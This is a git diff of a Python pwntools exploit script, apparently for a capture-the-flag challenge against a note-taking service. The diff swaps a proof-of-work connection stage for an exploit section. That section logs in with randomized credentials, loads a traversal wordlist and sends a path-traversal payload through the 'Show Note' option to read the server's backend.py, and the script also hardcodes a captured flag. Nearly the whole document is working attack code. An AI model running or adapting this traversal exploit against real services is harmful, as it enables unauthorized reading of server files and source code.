@@ -1,13 +1,13 @@
 from pwn import *
-from subprocess import *
+from tqdm import *
 
 cmd_dic = {1:'Login', 2:'Register', 3:'New Note', 4:'Edit Note', 5:'Show Note'}
-def dealing_cmd(r, cmd, note_name=b'test', content_len=b'5', content=b'test\n', offset=b'0'):
+def dealing_cmd(r, cmd, note_name=b'test', content_len=b'5', content=b'test\n', offset=b'0', random='0'):
     r.recvlines(7)
     if cmd == 1 or cmd == 2:
         r.sendline(str(cmd).encode())
-        r.sendlineafter(b'Username: ', b'sbk')
-        r.sendlineafter(b'Password: ', b'sbk')
+        r.sendlineafter(b'Username: ', b'sbk' + random.encode())
+        r.sendlineafter(b'Password: ', b'sbk' + random.encode())
         if b'Success' in r.recvline():
             log.success(f'Command {cmd_dic[cmd]} Successful')
         else:
@@ -37,34 +37,30 @@ def dealing_cmd(r, cmd, note_name=b'test', content_len=b'5', content=b'test\n', 
     if cmd == 5:
         r.sendline(str(cmd).encode())
         r.sendlineafter(b'Note Name: ', note_name)
-        r.sendlineafter(b'Offset: ', b'\n')
-        # log.info(f'Command {cmd_dic[cmd]} Successful')
-        log.critical(f'Content: {r.recvline()}')
-'''#########
-Dealing Connection and PoW
-#########'''
-r = remote('10.113.184.121', 10044)
-r.recvuntil(b'sha256(')
-prefix = r.recvuntil(b' + ').strip().decode().split(' ')[0]
-difficulty = r.recvline().strip().decode().split('(')[-1].split(')')[0]
-
-log.info(f"PoW's prefix = {prefix}, difficulty = {difficulty}")
-
-p = Popen(f"python ../pow_solver.py {prefix} {difficulty}", stdin=PIPE, stdout=PIPE, universal_newlines=True, shell=True)
-pow_result = p.stdout.readline().strip()
-log.info(f'PoW Result = {pow_result}')
-r.sendline(pow_result.encode())
-r.recvuntil(b'Your service is running on port ')
-init_port = r.recvuntil(b'.').decode().split('.')[0]
-log.info(f'Receive Port = {init_port}')
-r.close()
+        r.sendlineafter(b'Offset: ', offset)
+        res = r.recvline().decode().strip()
+        log.success(res)
+        log.success(r.recvline().decode().strip())
 
 '''#########
 Dealing Exploit
 #########'''
+f = open('./Deep-Traversal.txt', 'r').read().split()
+init_port = sys.argv[1]
+try:
+    init_idx = sys.argv[2]
+except:
+    init_idx = 0
 r = remote('10.113.184.121', init_port)
-dealing_cmd(r, 2)
-dealing_cmd(r, 1)
-# dealing_cmd(r, 3)
-# dealing_cmd(r, 5)
+random = os.urandom(1).hex()
+dealing_cmd(r, 2, random=random)
+dealing_cmd(r, 1, random=random)
+
+payload = b'../../../../../..////////////////////////////////////////////////////////////////////////////////backend.py'
+flag_1 = 'flag{Sh3l1cod3_but_y0u_c@nnot_get_she!!}'
+# for i in range(len(flag_1), 128):
+#     dealing_cmd(r, 5, payload, offset=str(i).encode())
+
+dealing_cmd(r, 5, payload)
+log.info("Done")
 r.interactive()
